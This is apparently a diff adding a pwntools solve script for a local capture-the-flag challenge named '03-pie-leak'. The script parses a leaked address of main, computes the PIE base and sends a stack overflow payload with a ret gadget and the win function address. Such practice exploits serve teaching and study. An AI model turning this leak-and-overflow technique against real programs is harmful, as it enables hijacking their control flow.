@@ -1,0 +1,19 @@
+from pwn import*
+chal='../chals/03-pie-leak/chal'
+e=ELF(chal)
+p_main=e.symbols['main']
+p_win=e.symbols['win']
+print(hex(p_main),hex(p_win))
+p=process(chal)
+p.recvuntil(b'0x')
+leaked=p.recvline().strip()
+print(leaked)
+leaked=int(b'0x'+leaked,16)
+base=leaked-p_main
+print(hex(leaked),hex(base))
+d_win=base+p_win
+d_ret=base+0x101a
+payload=b"A"*40+p64(d_ret)+p64(d_win)
+print(payload.hex())
+p.sendline(payload)
+print(p.recvall(timeout=2).decode(errors='replace'))
